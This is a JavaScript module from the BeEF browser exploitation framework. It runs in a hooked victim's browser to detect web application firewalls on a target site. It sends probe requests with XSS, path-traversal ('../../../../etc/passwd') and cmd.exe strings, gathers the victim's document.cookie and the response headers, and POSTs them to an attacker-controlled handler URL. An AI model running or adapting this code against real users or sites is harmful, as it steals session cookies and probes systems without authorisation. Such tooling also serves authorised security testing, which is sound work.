//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var cmddotexe = 'cmd.exe',
      xssString = '<script>alert(1)</script>',
      adminFolder = '/Admin_Files/',
      dirtString = '../../../../etc/passwd',
      xssStringEncoded = escape(xssString),
      statusResult = 'IN STATUS CODE : Nothing was found',
      data = '',
      xhr = new XMLHttpRequest(),
      attack = [xssString + '.html',
                dirtString,
                adminFolder,
                xssStringEncoded + '.html',
                cmddotexe],
      statusStore = {
                      '200': ['IN STATUS CODE : DenyALL WAF was found', 
                              'Condition Intercepted'],
                      '403': ['IN STATUS CODE : CloudFlare was found', 
                              'CloudFlare Ray ID:|var CloudFlare='],
                      //'403': ['IN STATUS CODE : Jiasule was found',
                      //        'notice-jiasule'],
                      '501': ['IN STATUS CODE : Trustwave ModSecurity was found', 
                              null], 
                      '999': ['IN STATUS CODE : Aqtronix WebKnight was found', 
                              null]
                    },
      cookiesResult, 
      headersResult;

  function normalRequest(targetUrl) {
    xhr.open('GET', targetUrl, false);
    xhr.send();
    
    var reqvHeaders = xhr.getAllResponseHeaders(),
        parsedHeaders = reqvHeaders.split(/[\s=;:]+/),
        headerStore = {},
        allHeaders;
    
    if (xhr.status in statusStore && 
      (statusStore[xhr.status][1] == null || 
      xhr.statusText.search(statusStore[xhr.status][1]) != -1)) { 
      statusResult = statusStore[xhr.status][0];
    }

    for (var i = 0; i < parsedHeaders.length; ++i) {
      if (!headerStore[parsedHeaders[i]]) {
        headerStore[parsedHeaders[i]] = true;
        allHeaders += parsedHeaders[i] + ';';
      }
    } 
    
    data = {
      cookie: document.cookie,
      headers: allHeaders
    };
  }
  
  function attackRequest(targetUrl, handlerUrl) {
    for (var i = 0; i < attack.length; i++) {
      normalRequest(targetUrl + attack[i]);
    }
    sendData(handlerUrl);
  }

  function sendData(handlerUrl) {
    xhr.open('POST', handlerUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
    xhr.send(JSON.stringify(data));
  }
  
  function checkWafHeader(handlerUrl) {
    xhr.open('GET', handlerUrl, false);
    xhr.send();
    cookiesResult = xhr.getResponseHeader('CookieResult');
    headersResult = xhr.getResponseHeader('HeaderResult');
    
    if (xhr.getResponseHeader('Detect') == '1')
      return 1
    else
      return 0
  }

  function sendResult(targetUrl, handlerUrl) {  
    normalRequest(targetUrl);
    sendData(handlerUrl);
    
    if (!checkWafHeader(handlerUrl)) {
      attackRequest(targetUrl);
      checkWafHeader(handlerUrl);    
    }
    
    beef.net.send('<%= @command_url %>', <%= @command_id %>, cookiesResult);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, headersResult);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, statusResult);
  }
  sendResult('<%= @targetUrl %>', '<%= @handlerUrl%>');
});
